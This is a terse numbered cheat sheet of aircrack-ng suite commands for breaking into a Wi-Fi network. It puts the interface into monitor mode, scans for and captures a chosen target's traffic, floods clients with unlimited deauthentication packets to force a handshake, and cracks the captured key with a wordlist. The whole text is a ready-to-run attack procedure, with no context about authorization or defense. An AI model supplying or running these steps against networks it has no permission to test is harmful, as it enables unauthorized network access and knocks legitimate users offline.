1. `sudo airmon-ng check kill` : Shutdown wifi processes before switching to monitor mode
2. `sudo airmon-ng start wlan0` : Start monitor mode
3. `sudo airodump-ng wlan0mon` : Start scanning local networks; Quit after finding target channel number and BSSID
4. `sudo airodump-ng -w wificapture -c channelNumber --bssid BSSIDnumber wlan0mon` : Start scanning target 
5. `sudo aireplay-ng --deauth 0 -a BSSIDnumber wlan0mon`: Send deauthentication packets
6. `aircrack-ng wificapture.cap -w wordlist.txt`
